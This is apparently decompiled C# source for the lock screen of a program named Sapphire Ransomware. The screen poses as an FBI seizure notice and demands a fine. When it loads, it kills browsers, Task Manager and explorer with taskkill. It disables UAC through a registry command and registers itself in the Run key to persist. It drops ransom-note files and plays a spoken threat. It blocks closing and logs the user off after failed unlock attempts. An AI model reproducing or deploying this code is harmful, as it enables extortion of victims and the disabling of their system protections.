using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Sapphire_Ransomware.My;

namespace Sapphire_Ransomware;

[DesignerGenerated]
public class Form2 : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox2")]
	internal virtual PictureBox PictureBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer2
	{
		[CompilerGenerated]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			Timer timer = _Timer2;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			timer = _Timer2;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	public Form2()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Expected O, but got Unknown
		//IL_0273: Unknown result type (might be due to invalid IL or missing references)
		//IL_027d: Expected O, but got Unknown
		//IL_0543: Unknown result type (might be due to invalid IL or missing references)
		//IL_054d: Expected O, but got Unknown
		//IL_05df: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e9: Expected O, but got Unknown
		//IL_065f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0669: Expected O, but got Unknown
		//IL_06fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0704: Expected O, but got Unknown
		//IL_0790: Unknown result type (might be due to invalid IL or missing references)
		//IL_079a: Expected O, but got Unknown
		//IL_083d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0847: Expected O, but got Unknown
		//IL_08c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ce: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		Label1 = new Label();
		Label2 = new Label();
		Label4 = new Label();
		TextBox1 = new TextBox();
		Button1 = new Button();
		Panel1 = new Panel();
		Timer1 = new Timer(components);
		GroupBox1 = new GroupBox();
		Label3 = new Label();
		Label5 = new Label();
		PictureBox2 = new PictureBox();
		Label6 = new Label();
		PictureBox1 = new PictureBox();
		Timer2 = new Timer(components);
		((Control)GroupBox1).SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Segoe UI Symbol", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.Black);
		((Control)Label1).set_Location(new Point(60, 195));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(766, 32));
		((Control)Label1).set_TabIndex(2);
		Label1.set_Text("This computer has been seized by the Federal Bureau of Investigation.");
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.Black);
		((Control)Label2).set_Location(new Point(91, 227));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(688, 150));
		((Control)Label2).set_TabIndex(3);
		Label2.set_Text(componentResourceManager.GetString("Label2.Text"));
		Label2.set_TextAlign((ContentAlignment)32);
		Label4.set_AutoSize(true);
		((Control)Label4).set_BackColor(Color.Transparent);
		((Control)Label4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.Black);
		((Control)Label4).set_Location(new Point(6, 25));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(206, 15));
		((Control)Label4).set_TabIndex(5);
		Label4.set_Text("Please enter unlock code here:");
		((Control)TextBox1).set_Location(new Point(9, 45));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(586, 20));
		((Control)TextBox1).set_TabIndex(6);
		((ButtonBase)Button1).set_BackColor(Color.MediumBlue);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)3);
		((Control)Button1).set_ForeColor(SystemColors.Control);
		((Control)Button1).set_Location(new Point(601, 45));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(133, 22));
		((Control)Button1).set_TabIndex(7);
		((ButtonBase)Button1).set_Text("Unlock");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Control)Panel1).set_Location(new Point(12, 29));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(863, 546));
		((Control)Panel1).set_TabIndex(0);
		Timer1.set_Interval(5000);
		((Control)GroupBox1).set_BackColor(Color.White);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label6);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label5);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button1);
		((Control)GroupBox1).set_Location(new Point(135, 389));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(740, 100));
		((Control)GroupBox1).set_TabIndex(9);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Unlock Panel");
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.Transparent);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.Black);
		((Control)Label3).set_Location(new Point(6, 68));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(90, 15));
		((Control)Label3).set_TabIndex(8);
		Label3.set_Text("Attempts left:");
		Label5.set_AutoSize(true);
		((Control)Label5).set_BackColor(Color.Transparent);
		((Control)Label5).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.Black);
		((Control)Label5).set_Location(new Point(102, 68));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(15, 15));
		((Control)Label5).set_TabIndex(9);
		Label5.set_Text("5");
		PictureBox2.set_Image((Image)componentResourceManager.GetObject("PictureBox2.Image"));
		((Control)PictureBox2).set_Location(new Point(-1, 58));
		((Control)PictureBox2).set_Name("PictureBox2");
		((Control)PictureBox2).set_Size(new Size(887, 134));
		PictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox2.set_TabIndex(10);
		PictureBox2.set_TabStop(false);
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.Transparent);
		((Control)Label6).set_Font(new Font("Segoe UI Symbol", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.Black);
		((Control)Label6).set_Location(new Point(-505, -5));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(268, 32));
		((Control)Label6).set_TabIndex(11);
		Label6.set_Text("Supported by Microsoft");
		((Control)PictureBox1).set_BackColor(Color.White);
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		((Control)PictureBox1).set_Location(new Point(12, 389));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(117, 100));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(11);
		PictureBox1.set_TabStop(false);
		Timer2.set_Interval(1000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Form)this).set_ClientSize(new Size(887, 501));
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox2);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Lock");
		((Form)this).set_TopMost(true);
		((Form)this).set_TransparencyKey(Color.Fuchsia);
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((ISupportInitialize)PictureBox2).EndInit();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TextBox1.get_Text(), "case12", false) == 0)
		{
			((Control)MyProject.Forms.Form3).Show();
			((Control)this).Hide();
			((Control)MyProject.Forms.Form4).Hide();
		}
		else
		{
			Label5.set_Text(Conversions.ToString(Conversions.ToDouble(Label5.get_Text()) - 1.0));
			Interaction.MsgBox((object)"Attempt has been logged, please pay the fine or serve your sentence.", (MsgBoxStyle)16, (object)"FBI");
		}
		if (Operators.CompareString(Label5.get_Text(), "1", false) == 0)
		{
			Interaction.Shell("logoff", (AppWinStyle)2, false, -1);
		}
		if (Operators.CompareString(Label5.get_Text(), "0", false) == 0)
		{
			Interaction.Shell("logoff", (AppWinStyle)2, false, -1);
		}
		if (Operators.CompareString(Label5.get_Text(), "-1", false) == 0)
		{
			Interaction.Shell("logoff", (AppWinStyle)2, false, -1);
		}
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.Form4).Show();
		Interaction.Shell("taskkill /f /im iexplore.exe", (AppWinStyle)2, false, -1);
		Interaction.Shell("taskkill /f /im chrome.exe", (AppWinStyle)2, false, -1);
		Interaction.Shell("taskkill /f /im opera.exe", (AppWinStyle)2, false, -1);
		Interaction.Shell("taskkill /f /im firefox.exe", (AppWinStyle)2, false, -1);
		Interaction.Shell("taskkill /f /im taskmgr.exe", (AppWinStyle)2, false, -1);
		Interaction.Shell("taskkill /f /im explorer.exe", (AppWinStyle)2, false, -1);
		((Control)this).BringToFront();
		Interaction.Shell("cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", (AppWinStyle)2, false, -1);
		((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
		File.Create(Environment.CurrentDirectory + "\\readme.txt").Close();
		File.Create(Environment.CurrentDirectory + "\\readme-1.txt").Close();
		File.Create(Environment.CurrentDirectory + "\\readme-2.txt").Close();
		File.Create(Environment.CurrentDirectory + "\\readme-3.txt").Close();
		File.Create(Environment.CurrentDirectory + "\\readme-4.txt").Close();
		File.Create(Environment.CurrentDirectory + "\\LOCKEDBYFBI.hta").Close();
		File.Create(Environment.CurrentDirectory + "\\decryptfiles.html").Close();
		NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.spvoice", "")), (Type)null, "speak", new object[1] { "Do not turn off your computer system. Warning, your computer has been locked in a joint effort between goverment organizations. All your illegal files have been locked, exfiltrated and encrypted. We notice your criminal activity online, including torrenting, warez and more. Do not attempt to close the FBI Secure Browser or your system will be permanently locked and the FBI will arrest you then take all your files away." }, (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		((Control)this).BringToFront();
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		Interaction.Shell("taskkill /f /im cmd.exe", (AppWinStyle)2, false, -1);
		Timer2.set_Enabled(false);
	}
}
